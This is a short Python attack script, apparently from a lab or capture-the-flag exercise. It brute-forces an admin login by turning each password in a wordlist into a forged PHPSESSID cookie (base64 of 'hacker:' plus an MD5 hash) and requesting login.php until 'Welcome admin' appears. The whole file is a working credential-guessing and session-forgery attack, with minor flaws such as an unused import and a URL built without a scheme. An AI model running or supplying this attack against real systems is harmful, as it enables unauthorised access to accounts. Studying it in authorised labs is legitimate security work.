from unittest import TestProgram
import requests
import sys
import hashlib
import base64

def generate_cookie(password):

    pass_hash = hashlib.md5(password.encode("utf-8")).hexdigest()
    creds = "hacker:" + pass_hash
    creds_bytes = creds.encode("ascii")
    cookie = base64.b64encode(creds_bytes)
    return cookie
 
def login(url, pass_file):
    file = open(pass_file, "r")

    for passwords in file.readlines():

        password = passwords.strip("\n")

        cookie = generate_cookie(password)

        response = requests.get(url, cookies={"PHPSESSID": cookie})
        
        if "Welcome admin" in response.text:
            print(f"(+) Password found! ====> {password}")
            sys.exit(1)



def main():
    if len(sys.argv) != 3:
        print(f"(+) Usage: python3 {sys.argv[0]} <IP> <Passwords file>")
        print(f"(+) Example: python {sys.argv[0]} 10.10.10.10 passwords.txt ")
        sys.exit(1)

    print("(+) Starting the attack..")

    ip = sys.argv[1]
    pass_file = sys.argv[2]
    url = ip + "/login.php"

    login(url, pass_file)

if __name__ == "__main__":
    main()